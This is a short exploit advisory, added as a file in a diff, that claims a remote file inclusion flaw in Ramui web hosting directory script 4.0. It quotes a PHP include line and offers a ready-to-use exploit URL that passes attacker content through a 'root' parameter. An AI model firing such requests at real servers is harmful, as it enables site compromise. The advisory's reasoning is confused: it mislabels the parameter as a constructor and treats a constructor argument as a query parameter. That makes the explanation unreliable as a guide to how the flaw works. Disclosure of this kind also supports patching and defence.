@@ -1,0 +1,33 @@
+# Title: Ramui web hosting directory script 4.0 Remote File Include Vulnerability
+# Author: bd0rk
+# Twitter: twitter.com/bd0rk
+# Vendor: http://www.ramui.com
+# Download: http://ramui.com/directory-script/download-v4.html
+
+Proof-of-Concept:
+/gb/include/connection.php lines 6-13 in php-sourcecode
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+class connection
+{
+protected $site;
+public $error=false;
+protected $admin=false;
+function __construct($root)
+{
+        include $root."database/config.php";
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+The $root-parameter is a __construct.
+But no value was passed to him.
+Therefore, nothing can be checked before include in line 13.
+So an attacker can execute malicious shellcode about it.
+In this case, the __construct is meaningless.
+
+
+[+]Exploit: http://[server]/path/gb/include/connection.php?root=[YourShellcode]
+
+
+~~Everything revolves. Even the planet. :)~~
+***Greetz to ALL my followers on Twitter!***
+
+/bd0rk
